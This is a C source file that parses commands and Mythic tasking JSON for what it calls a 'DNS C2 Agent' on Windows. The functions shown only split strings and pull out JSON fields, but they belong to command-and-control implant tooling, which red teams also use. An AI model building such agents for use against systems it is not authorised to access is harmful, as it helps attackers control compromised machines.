// source/Parser.c
/**
 * Parser.c - Command parsing for DNS C2 Agent
 *
 * Handles parsing of commands received from the C2 server.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../include/Parser.h"
#include "../include/Utils.h"
#include "../include/mythic.h"  // para MythicTask

// Static empty string to avoid unnecessary allocations
static const char EMPTY_STRING[] = "";

/**
 * Parse a command string
 */
BOOL parse_command(const char* command_str, char** command, char** args) {
    if (!command_str || !*command_str) return FALSE;
    char* copy = _strdup(command_str);
    if (!copy) return FALSE;
    char* space = strchr(copy, ' ');
    if (space) {
        *space = '\0';
        *command = _strdup(copy);
        *args    = _strdup(*(space+1) ? space+1 : EMPTY_STRING);
    } else {
        *command = _strdup(copy);
        *args    = _strdup(EMPTY_STRING);
    }
    free(copy);
    return (*command && *args);
}

/**
 * Parse arguments into an array of strings
 */
BOOL parse_args(const char* args, int* argc, char*** argv) {
    if (!args || !*args) { *argc=0; *argv=NULL; return TRUE; }
    int count = 1;
    for (const char* p = args; (p = strchr(p,' ')); ++count, ++p);
    *argv = malloc(count * sizeof(char*));
    if (!*argv) return FALSE;
    char* copy = _strdup(args);
    if (!copy) { free(*argv); *argv=NULL; return FALSE; }
    char* ctx = NULL;
    char* tok = strtok_s(copy, " ", &ctx);
    int i = 0;
    while (tok && i < count) {
        (*argv)[i++] = _strdup(tok);
        tok = strtok_s(NULL, " ", &ctx);
    }
    free(copy);
    *argc = i;
    return TRUE;
}

/**
 * Free the arguments array
 */
void free_args(int argc, char** argv) {
    if (!argv) return;
    for (int i = 0; i < argc; i++) free(argv[i]);
    free(argv);
}

/**
 * parse_tasking_json
 *
 * Extrae de un JSON de Mythic los campos "id", "command" y "params"
 * y los copia en el MythicTask* out.
 */
BOOL parse_tasking_json(const char* buf, size_t len, MythicTask* out) {
    if (!buf || !out) return FALSE;
    // buscar "id"
    const char* p = strstr(buf, "\"id\"");
    if (!p) return FALSE;
    p = strchr(p, ':'); if (!p) return FALSE; ++p;
    while (*p==' '||*p=='\"') ++p;
    const char* start = p;
    while (*p && *p!='\"') ++p;
    size_t l = p - start;
    if (l >= sizeof(out->id)) return FALSE;
    memcpy(out->id, start, l);
    out->id[l] = '\0';

    // buscar "command"
    p = strstr(buf, "\"command\"");
    if (!p) return FALSE;
    p = strchr(p, ':'); if (!p) return FALSE; ++p;
    while (*p==' '||*p=='\"') ++p;
    start = p;
    while (*p && *p!='\"') ++p;
    l = p - start;
    if (l >= sizeof(out->command)) return FALSE;
    memcpy(out->command, start, l);
    out->command[l] = '\0';

    // buscar "params"
    p = strstr(buf, "\"params\"");
    if (!p) { out->params[0]=0; return TRUE; }
    p = strchr(p, ':'); if (!p) return FALSE; ++p;
    while (*p==' ') ++p;
    start = p;
    if (*p=='{') {
        int depth = 1;
        ++p;
        while (*p && depth) {
            if (*p=='{') ++depth;
            else if (*p=='}') --depth;
            ++p;
        }
    } else if (*p=='\"') {
        ++p;
        while (*p && *p!='\"') ++p;
    } else {
        while (*p && *p!=',' && *p!='}') ++p;
    }
    l = p - start;
    if (l >= sizeof(out->params)) return FALSE;
    memcpy(out->params, start, l);
    out->params[l] = '\0';

    return TRUE;
}
